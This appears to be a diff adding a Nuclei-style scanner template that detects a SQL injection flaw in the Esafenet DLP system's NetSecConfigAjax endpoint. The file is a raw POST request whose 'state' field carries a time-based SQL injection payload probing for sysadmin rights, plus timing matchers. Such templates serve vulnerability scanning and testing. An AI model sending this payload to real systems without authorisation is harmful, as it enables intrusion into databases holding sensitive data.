@@ -1,0 +1,45 @@
+id: YiSaiTong(DLP_sys)-NetSecConfigAjax-SQLinjection
+
+info:
+  name: 亿赛通数据泄露防护(DLP)系统-NetSecConfigAjax-SQL注入
+  author: htq
+  severity: high
+
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /CDGServer3/NetSecConfigAjax;Service HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: JSESSIONID=99CEC1B294F4EEEA7AFC46D8D4741917; JSESSIONID=06DCD58EDC037F785605A29CD7425C66
+    Cache-Control: max-age=0
+    Sec-Ch-Ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"
+    Sec-Ch-Ua-Mobile: ?0
+    Sec-Ch-Ua-Platform: "Windows"
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Sec-Fetch-Site: cross-site
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-User: ?1
+    Sec-Fetch-Dest: document
+    Referer:
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Priority: u=0, i
+    Connection: close
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 100
+
+    command=updateNetSec&state=123';if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:10'--+
+
+  matchers-condition: and
+  matchers:
+    - type: dsl
+      dsl:
+        - "duration > 10"
+    - type: status
+      status:
+        - 200
+ 
